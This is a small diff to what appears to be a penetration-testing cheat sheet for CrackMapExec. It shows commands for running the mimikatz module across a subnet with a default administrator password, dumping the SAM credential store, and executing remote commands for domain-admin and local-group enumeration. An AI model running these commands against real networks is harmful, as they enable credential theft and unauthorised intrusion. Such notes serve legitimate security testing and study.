@@ -15,3 +15,8 @@ crackmapexec smb 192.168.1.1/24 -u Administrator -p Password1 -M mimikatz
 
 Dump SAM File:
 crackmapexec smb <ip> -u <uname> -p <password>--sam
+
+Run commands
+crackmapexec smb <ip> -u <name> -p <password> -k <command>
+  - net user "Domain Admins" /domain
+  - net localgroup users
